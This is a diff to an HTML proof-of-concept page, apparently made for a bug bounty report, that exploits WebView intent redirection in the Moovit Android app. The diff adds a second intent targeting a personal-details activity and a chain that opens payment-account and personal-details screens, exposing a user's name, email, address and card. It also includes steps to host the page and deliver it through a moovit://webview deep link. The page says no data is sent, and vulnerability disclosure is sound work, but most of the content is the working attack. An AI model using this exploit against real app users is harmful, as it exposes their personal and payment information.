@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Moovit P1 PoC - WebView Intent Redirection + Data Exposure</title>
+    <title>Moovit P1 PoC - WebView Intent Redirection + Sensitive Data Exposure</title>
     <style>
         body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background: #f8f9fa; }
         h1 { color: #d32f2f; }
@@ -21,11 +21,13 @@
         No real user data is collected or sent. It only launches internal activities via Intent.
     </div>
 
-    <button onclick="launchAccount()">Launch Account Activity (Data Exposure)</button>
+    <button onclick="launchAccount()">Launch Payment Account Activity (Full PII + Card)</button>
+    <button onclick="launchEditDetails()">Launch Personal Details Edit (Name + Email + Address)</button>
     <button onclick="autoLaunchChain()">Auto Launch Chain (All Sensitive Screens)</button>
 
     <script>
-        const accountIntent = "intent:#Intent;component=com.tranzmate/com.moovit.app.account.AccountActivity;end";
+        const accountIntent = "intent:#Intent;component=com.tranzmate/com.moovit.payment.account.PaymentAccountActivity;end";
+        const editDetailsIntent = "intent:#Intent;component=com.tranzmate/com.moovit.payment.account.personalinfo.PaymentAccountEditDetailsActivity;end";
 
         function sendIntent(intentStr) {
             console.log("%c[Moovit PoC] Sending Intent: " + intentStr, "color: red; font-weight: bold");
@@ -35,7 +37,14 @@
         function launchAccount() {
             sendIntent(accountIntent);
             setTimeout(() => {
-                alert("✅ P1 Confirmed!\n\nSensitive user data exposed:\n• Full name\n• Email address\n• Payment card details (Visa ****2731)\n\nAccount screen opened with real user information.");
+                alert("✅ P1 Confirmed!\n\nSensitive user data exposed:\n• Full name\n• Email address\n• Payment card (Visa ****2731)\n\nReal user profile and card details visible.");
+            }, 800);
+        }
+
+        function launchEditDetails() {
+            sendIntent(editDetailsIntent);
+            setTimeout(() => {
+                alert("✅ P1 Confirmed - Additional PII!\nName, email, and address loaded from PersonalDetails Parcelable.");
             }, 800);
         }
 
@@ -43,25 +52,26 @@
             console.log("%c[Moovit PoC] Starting Auto Chain...", "color: red");
             sendIntent(accountIntent);
             setTimeout(() => {
-                alert("✅ P1 Confirmed - Data Exposure\nUser profile, email, and payment card visible.\n\nThis proves security boundary violation.");
+                sendIntent(editDetailsIntent);
             }, 1200);
+            setTimeout(() => {
+                alert("✅ P1 Confirmed - Security boundary violation\nFull user profile, email, address, and payment card exposed via WebView Intent Redirection.");
+            }, 2500);
         }
 
-        // Auto start when opened inside Moovit WebView
         window.onload = function() {
             console.log("%c[Moovit PoC] Loaded inside Moovit WebView", "color: green; font-size: 16px");
-            // Uncomment next line for full auto-run during video recording:
-            // autoLaunchChain();
+            // Uncomment for full auto-run in video: autoLaunchChain();
         };
     </script>
 
     <h2>How to test:</h2>
     <ol style="text-align: left; max-width: 600px; margin: 20px auto;">
         <li>Host this file publicly (GitHub Pages recommended).</li>
-        <li>Send deep link: <code>moovit://webview?url=https://your-link/movitpoc3.html</code></li>
-        <li>Click button or let auto-run → Account screen opens with real user data.</li>
+        <li>Send deep link: <code>moovit://webview?url=https://your-link/movitpoc4.html</code></li>
+        <li>Click buttons or auto-run → Real user data (name, email, card) becomes visible.</li>
     </ol>
 
-    <p><strong>Recorded video tip:</strong> Run with auto-launch enabled for clean demo.</p>
+    <p><strong>Video tip:</strong> Run with auto-launch enabled for clean demo.</p>
 </body>
 </html>
